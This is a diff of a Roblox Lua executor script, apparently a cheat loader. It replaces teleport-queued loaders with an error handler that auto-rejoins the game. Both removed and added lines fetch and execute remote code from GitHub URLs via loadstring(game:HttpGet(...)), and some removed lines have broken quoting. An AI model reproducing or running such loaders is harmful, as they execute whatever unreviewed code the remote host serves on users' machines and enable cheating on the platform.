@@ -1,7 +1,19 @@
-if syn and syn.queue_on_teleport then
-    syn.queue_on_teleport('loadstring(game:HttpGet("https://raw.githubusercontent.com/Zayn31214/name/refs/heads/main/SterlingNew"))()", true))()
-elseif queue_on_teleport then
-    queue_on_teleport('loadstring(game:HttpGet("https://github.com/Deetye/aaaa/blob/main/SPIKED.txt", true))()
+local GuiService = game:GetService("GuiService")
+local Players = game:GetService("Players")
+local TeleportService = game:GetService("TeleportService")
+
+local player = Players.LocalPlayer
+
+local function onErrorMessageChanged(errorMessage)
+    if errorMessage and errorMessage ~= "" then
+        print("Error detected: " .. errorMessage)
+
+        if player then
+            wait()
+            TeleportService:Teleport(game.PlaceId, player)
+        end
+    end
 end
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Deetye/aaaa/refs/heads/Deetye-patch-1/SPIKED.txt", true))()
+GuiService.ErrorMessageChanged:Connect(onErrorMessageChanged)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Zayn31214/name/refs/heads/main/SterlingNew"))()
